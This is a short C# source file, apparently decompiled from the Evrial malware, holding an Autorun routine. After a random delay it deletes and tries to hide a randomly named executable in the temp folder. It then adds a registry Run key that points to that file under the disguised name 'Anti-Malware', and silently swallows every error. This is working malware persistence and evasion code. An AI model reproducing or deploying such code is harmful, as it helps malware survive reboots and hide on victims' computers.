

using Microsoft.Win32;
using System;
using System.IO;
using System.Threading;

namespace Evrial.Hardware
{
  internal static class Run
  {
    public static void Autorun()
    {
      Thread.Sleep(new Random().Next(1000, 2000));
      string path = Path.GetTempPath() + "\\gGlBmTM.exe";
      try
      {
        if (File.Exists(path))
        {
          try
          {
            File.SetAttributes(path, FileAttributes.Normal);
            File.Delete(path);
          }
          catch
          {
          }
        }
        if (!File.Exists(path))
        {
          try
          {
            File.SetAttributes(path, FileAttributes.Hidden);
          }
          catch
          {
          }
        }
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"))
          subKey.SetValue("Anti-Malware", (object) (Path.GetTempPath() + "gGlBmTM.exe"));
      }
      catch
      {
      }
    }
  }
}
